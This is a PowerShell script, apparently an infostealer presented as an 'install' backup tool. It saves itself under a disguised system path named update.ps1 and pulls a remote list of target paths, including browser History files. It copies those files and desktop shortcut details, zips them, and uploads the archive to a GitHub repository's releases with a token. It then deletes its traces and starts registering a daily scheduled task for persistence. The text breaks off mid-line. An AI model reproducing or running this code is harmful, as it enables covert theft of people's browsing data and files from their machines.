# install.ps1 - 主功能：上传文件 + 注册定时任务
$script:logPath = "C:\upload_log.txt"

function Log($msg) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    try {
        $line | Out-File $script:logPath -Append -Encoding utf8
    } catch {
        Write-Host "❌ 日志写入失败: $($_.Exception.Message)"
    }
    Write-Host $line
}

Log "===== INSTALL EXECUTED ====="

# === 下载自身到固定路径（以便任务执行） ===
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"

try {
    Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    Log "[OK] install.ps1 downloaded to $localPath"
} catch {
    Log "❌ Failed to download install.ps1: $($_.Exception.Message)"
    return
}

# === 获取 GitHub Token（从环境变量） ===
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ GITHUB_TOKEN 环境变量不存在，终止执行。"
    return
}
Log "[DEBUG] GITHUB_TOKEN detected"

# === 上传逻辑（文件收集、打包、上传） ===
try {
    $repo = "drftghy/backup-files"
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName
    New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

    # 加载上传路径
    $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
    $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }

    $i = 0
    foreach ($path in $paths) {
        $i++
        $dst = Join-Path $tempRoot "item$i"
        try {
            if (-not (Test-Path $path)) { continue }
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                robocopy (Split-Path $path) $dst (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dst -Recurse -Force
            } else {
                Copy-Item $path -Destination $dst -Force
            }
        } catch {
            Log "⚠️ Failed to copy path: ${path} => $($_.Exception.Message)"
        }
    }

    # 收集桌面快捷方式
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $s = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTarget: $($s.TargetPath)`nArgs: $($s.Arguments)`nStartIn: $($s.WorkingDirectory)`nIcon: $($s.IconLocation)`n---`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        Log "⚠️ Failed to extract .lnk shortcuts: $($_.Exception.Message)"
    }

    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force

    # 上传 Release
    $releaseData = @{
        tag_name    = $tag
        name        = $releaseName
        body        = "Auto backup from $computerName"
        draft       = $false
        prerelease  = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "PowerShell"
        Accept        = "application/vnd.github.v3+json"
    }

    $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"

    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShell"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
    Log "[OK] Upload completed."
} catch {
    Log "❌ Upload failed: $($_.Exception.Message)"
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# === 注册计划任务，每天 0:00 执行 update.ps1 ===
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName
